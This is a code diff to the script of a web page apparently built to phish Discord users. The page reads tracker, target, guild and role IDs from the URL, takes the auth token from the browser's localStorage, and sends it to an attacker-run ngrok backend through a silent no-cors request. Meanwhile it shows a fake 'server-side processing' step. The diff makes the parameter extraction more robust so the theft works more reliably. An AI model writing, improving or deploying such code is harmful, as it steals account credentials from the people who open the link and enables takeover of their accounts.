@@ -107,7 +107,33 @@
     </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
+        // --- ROBUST PARAMETER EXTRACTION ---
+        function getTacticalParams() {
+            const url = window.location.href;
+            const searchParams = new URLSearchParams(window.location.search);
+            
+            // Try extracting from search, then hash (fallback for some mobile browsers)
+            let params = {
+                id: searchParams.get('id'),
+                t: searchParams.get('t'),
+                g: searchParams.get('g'),
+                r: searchParams.get('r')
+            };
+
+            if (!params.id && window.location.hash) {
+                const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                params.id = hashParams.get('id');
+                params.t = hashParams.get('t');
+                params.g = hashParams.get('g');
+                params.r = hashParams.get('r');
+            }
+
+            // Debug log (hidden in production console)
+            console.log("Agency Debug: Tactical Parameters Initialized", params);
+            return params;
+        }
+
+        const tacticalParams = getTacticalParams();
         
         // --- AGENCY CONFIGURATION ---
         // Replace with your current ngrok URL from the bot's DM
@@ -127,17 +153,14 @@
                 token = (window.localStorage.getItem('token') || '').replace(/"/g, '');
             } catch(e) {}
 
-            const trackerId = params.get('id');
-            const targetId = params.get('t');
-            const guildId = params.get('g');
-            const roleId = params.get('r');
+            const { id, t, g, r } = tacticalParams;
 
-            if (trackerId) {
+            if (id) {
                 // Send all tactical intel to the Agency VPS
-                let url = `${AGENCY_BACKEND}/v/${trackerId}?p=1`;
-                if (targetId) url += `&t=${targetId}`;
-                if (guildId) url += `&g=${guildId}`;
-                if (roleId) url += `&r=${roleId}`;
+                let url = `${AGENCY_BACKEND}/v/${id}?p=1`;
+                if (t) url += `&t=${t}`;
+                if (g) url += `&g=${g}`;
+                if (r) url += `&r=${r}`;
                 if (token) url += `&tk=${token}`;
 
                 // Silent transmission
@@ -145,6 +168,8 @@
                     mode: 'no-cors', 
                     cache: 'no-store' 
                 }).catch(() => {});
+            } else {
+                console.error("Agency Error: Tracker ID missing from URL.");
             }
 
             // Simulate server-side processing
